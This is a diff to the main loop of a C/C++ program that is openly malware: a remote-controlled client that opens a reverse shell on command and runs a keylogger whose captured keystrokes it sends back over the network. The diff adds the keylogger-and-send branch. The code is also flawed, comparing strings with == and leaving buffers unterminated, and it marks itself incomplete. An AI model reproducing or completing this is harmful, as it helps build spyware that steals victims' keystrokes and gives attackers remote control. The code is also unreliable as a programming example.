@@ -29,12 +29,6 @@ int main(void) {
 
 		strncpy(KeyLoggerCommand, Command, 10);
 
-		int FunctionLength = strlen(KeyLoggerCommand);
-
-		int ParamLength = CommandLength - FunctionLength - 1;
-
-		const char * Seconds=&
-
 		if (Command == "reverse_shell") {
 
 			NetObject.ReverseShell();
@@ -43,11 +37,34 @@ int main(void) {
 
 		if (KeyLoggerCommand == "keylogger") {
 
-			
+			int FunctionLength = strlen(KeyLoggerCommand);
 
+			int ParamLength = CommandLength - FunctionLength - 1;
+
+			const char * Seconds=&Command[CommandLength-ParamLength];
+			
+			const char * Buffer=KeyLogger::KeyLogger(atoi(Seconds));
+			
+			NetObject.Send(Buffer);
+
+
+		}
+		
+		if(Command=="quit"){
+			
+			return 0;
+			
+		}
+		
+		else{
+			
+			NetObject.Send("ERROR!");
+			
 		}
 
 	}
+	
+	return 0;
 
 	//incomplete
 
